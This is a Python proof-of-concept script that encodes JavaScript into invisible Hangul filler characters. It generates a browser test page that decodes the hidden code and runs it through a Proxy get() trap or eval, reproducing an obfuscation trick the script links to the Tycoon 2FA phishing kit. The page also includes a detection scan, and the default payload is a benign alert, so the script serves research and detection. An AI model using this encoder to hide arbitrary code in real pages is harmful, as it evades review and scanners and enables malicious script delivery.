#!/usr/bin/env python3
"""
Hangul Filler Invisible JS Encoder
Generates a browser test page with a Proxy get() trap execution chain.
Reproduces the technique weaponized by Tycoon 2FA (Jan 2025).
"""

import os, json, argparse
from pathlib import Path

ZERO = '\uFFA0'  # Hangul Half-Width Filler = binary 0
ONE  = '\u3164'  # Hangul Full-Width Filler = binary 1


def encode_hangul(js_code: str) -> str:
    result = []
    for ch in js_code:
        byte = ord(ch)
        for bit in range(7, -1, -1):
            result.append(ONE if (byte >> bit) & 1 else ZERO)
    return ''.join(result)


def decode_hangul(encoded: str) -> str:
    result = []
    for i in range(0, len(encoded), 8):
        byte = 0
        for bit in range(8):
            if i + bit < len(encoded) and encoded[i + bit] == ONE:
                byte |= (1 << (7 - bit))
        result.append(chr(byte))
    return ''.join(result)


parser = argparse.ArgumentParser(
    description='Hangul Filler Invisible JS Encoder — Security Research PoC')
parser.add_argument('--payload', type=str, default=None,
                    help='Custom JS payload (default: alert demo)')
args = parser.parse_args()

PAYLOAD = args.payload or 'alert("Hello from invisible Hangul payload!")'
encoded = encode_hangul(PAYLOAD)

assert decode_hangul(encoded) == PAYLOAD, "Round-trip verification failed"

BASE = Path(__file__).resolve().parent

html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Hangul Invisible JS — Proxy get() Trap Test</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{
  font-family: "SF Mono","Fira Code","Cascadia Code",monospace;
  background: #0d1117; color: #c9d1d9; padding: 2rem; line-height: 1.7;
}}
h1 {{ color:#ff7b72; font-size:1.3rem; margin-bottom:.5rem; }}
h2 {{ color:#7ee787; font-size:1.05rem; margin:1.6rem 0 .6rem; }}
.subtitle {{ color:#8b949e; font-size:.9rem; margin-bottom:1.5rem; border-bottom:1px solid #21262d; padding-bottom:1rem; }}
.panel {{
  background:#161b22; border:1px solid #30363d; border-radius:8px;
  padding:1rem; margin:.6rem 0; overflow-x:auto;
}}
.panel pre {{ white-space:pre-wrap; word-break:break-all; font-size:.82rem; }}
.tag {{
  display:inline-block; padding:2px 8px; border-radius:4px;
  font-size:.72rem; font-weight:600; margin-right:6px;
}}
.tag-red   {{ background:#da36451a; color:#f85149; border:1px solid #da364533; }}
.tag-green {{ background:#2ea04366; color:#7ee787; border:1px solid #2ea04333; }}
.metric {{ display:flex; gap:1.5rem; flex-wrap:wrap; margin:.6rem 0; }}
.metric-item {{
  background:#0d1117; border:1px solid #30363d; border-radius:6px;
  padding:.6rem 1rem; min-width:160px;
}}
.metric-item .label {{ color:#8b949e; font-size:.72rem; }}
.metric-item .value {{ color:#f0f6fc; font-size:1.2rem; font-weight:700; margin-top:2px; }}
button {{
  background:#238636; color:#fff; border:none; padding:8px 20px;
  border-radius:6px; font-size:.9rem; cursor:pointer; font-weight:600;
  margin-top:.8rem;
}}
button:hover {{ background:#2ea043; }}
.code-block {{
  background:#0d1117; border:1px solid #30363d; border-radius:6px;
  padding:1rem; margin:.6rem 0; font-size:.8rem; overflow-x:auto; color:#e6edf3;
}}
.kw {{ color:#ff7b72; }} .fn {{ color:#d2a8ff; }} .st {{ color:#a5d6ff; }} .cm {{ color:#8b949e; }}
</style>
</head>
<body>

<h1>Hangul Filler Invisible JS &middot; Proxy get() Trap</h1>
<div class="subtitle">
  Reproducing Martin Kleppe's scheme (Oct 2024), weaponized by Tycoon 2FA (Jan 2025)
</div>

<h2>Test 1 &middot; Bootstrap source code</h2>
<div class="code-block">
<pre><span class="kw">new</span> <span class="fn">Proxy</span>({{}}, {{
  <span class="fn">get</span>: (_, name) =>
    <span class="fn">eval</span>(
      [...name]
        .map(c => +(<span class="st">"\\uFFA0"</span> > c))
        .join(<span class="st">""</span>)
        .replace(<span class="st">/.{{8}}/g</span>, b =>
          String.fromCharCode(+(<span class="st">"0b"</span> + b))
        )
    )
}}).<span class="cm">(invisible property name — encoded payload)</span></pre>
</div>

<h2>Test 2 &middot; Visual invisibility</h2>
<div class="panel">
  <span class="tag tag-red">Encoded payload ({len(encoded)} Hangul chars — should appear blank)</span>
  <pre id="enc" style="min-height:40px;background:#0d1117;padding:8px;border-radius:4px;margin-top:6px"></pre>
</div>
<div class="panel">
  <span class="tag tag-green">Original payload</span>
  <pre id="orig"></pre>
</div>

<h2>Test 3 &middot; Metrics</h2>
<div class="metric" id="metrics"></div>

<h2>Test 4 &middot; Decode trace (first 5 chars)</h2>
<div class="panel"><pre id="trace"></pre></div>

<h2>Test 5 &middot; Proxy get() execution</h2>
<p>Click to trigger Kleppe's original Proxy get() chain:</p>
<button onclick="runProxy()">Trigger Proxy get()</button>
<div id="r1" style="margin-top:.8rem"></div>

<h2>Test 6 &middot; Direct eval (comparison)</h2>
<button onclick="runEval()">Direct eval</button>
<div id="r2" style="margin-top:.8rem"></div>

<h2>Test 7 &middot; Detection scan</h2>
<button onclick="detect()">Run detection</button>
<div class="panel" style="margin-top:.6rem"><pre id="det"></pre></div>

<script>
const E = `{encoded}`;
const O = {json.dumps(PAYLOAD)};
document.getElementById("enc").textContent = E;
document.getElementById("orig").textContent = O;

const eLen = [...E].length, pLen = O.length;
document.getElementById("metrics").innerHTML = [
  {{l:"Original payload",v:pLen+" chars"}},
  {{l:"Hangul encoded",v:eLen+" chars"}},
  {{l:"Ratio",v:"1:8"}},
  {{l:"U+FFA0 (=0)",v:[...E].filter(c=>c==="\\uFFA0").length}},
  {{l:"U+3164 (=1)",v:[...E].filter(c=>c==="\\u3164").length}},
].map(m=>`<div class="metric-item"><div class="label">${{m.l}}</div><div class="value">${{m.v}}</div></div>`).join("");

(function(){{
  const cs=[...E], lines=[], n=Math.min(5,Math.floor(cs.length/8));
  for(let i=0;i<n;i++){{
    const g=cs.slice(i*8,i*8+8), bits=g.map(c=>+("\\uFFA0">c)), bin=bits.join(""),
          cc=parseInt(bin,2), ch=String.fromCharCode(cc);
    lines.push(`Char #${{i+1}}:  ${{g.map(c=>c==="\\u3164"?"1":"0").join(" ")}}\\n         Binary: ${{bin}}  ->  ${{cc}}  ->  '${{ch}}'`);
  }}
  if(pLen>n) lines.push(`... ${{pLen}} chars total`);
  document.getElementById("trace").textContent=lines.join("\\n\\n");
}})();

function runProxy(){{
  const p=new Proxy({{}},{{get:(_,n)=>eval([...n].map(c=>+("\\uFFA0">c)).join("").replace(/.{{8}}/g,b=>String.fromCharCode(+("0b"+b))))}});
  p[E];
  const el=document.getElementById("r1");
  el.style.cssText="padding:.5rem .8rem;border-radius:6px;background:#2ea04326;color:#7ee787;border:1px solid #2ea04344;font-weight:600";
  el.textContent="Proxy get() trap fired — alert displayed";
}}
function runEval(){{
  const code=[...E].map(c=>+("\\uFFA0">c)).join("").replace(/.{{8}}/g,b=>String.fromCharCode(+("0b"+b)));
  eval(code);
  const el=document.getElementById("r2");
  el.style.cssText="padding:.5rem .8rem;border-radius:6px;background:#2ea04326;color:#7ee787;border:1px solid #2ea04344;font-weight:600";
  el.textContent="Direct eval — decoded: "+code;
}}
function detect(){{
  const t=document.documentElement.innerHTML;
  let a=0,b=0;
  for(const c of t){{ if(c==="\\uFFA0")a++; if(c==="\\u3164")b++; }}
  const s=a+b, el=document.getElementById("det");
  el.textContent=s>0
    ?`[ALERT] Hangul fillers detected\\n  U+FFA0 (=0): ${{a}}\\n  U+3164 (=1): ${{b}}\\n  Total: ${{s}}\\n  Payload size: ${{Math.floor(s/8)}} bytes`
    :"[CLEAN] No Hangul fillers detected";
}}
</script>
</body>
</html>'''

(BASE / 'hangul_proxy_test.html').write_text(html, encoding='utf-8')

z = encoded.count(ZERO)
o = encoded.count(ONE)
print(f"\n{'='*55}")
print(f"  Hangul Filler Encoder — Build Report")
print(f"{'='*55}")
print(f"  Payload:        {PAYLOAD[:50]}{'...' if len(PAYLOAD)>50 else ''}")
print(f"  Payload size:   {len(PAYLOAD)} chars")
print(f"  Encoded length: {len(encoded)} Hangul chars")
print(f"  Encoding ratio: 1:8")
print(f"  U+FFA0 (=0):   {z}")
print(f"  U+3164 (=1):   {o}")
print(f"  Round-trip:     PASSED")
print(f"  Output:         {BASE / 'hangul_proxy_test.html'}")
print(f"{'='*55}\n")
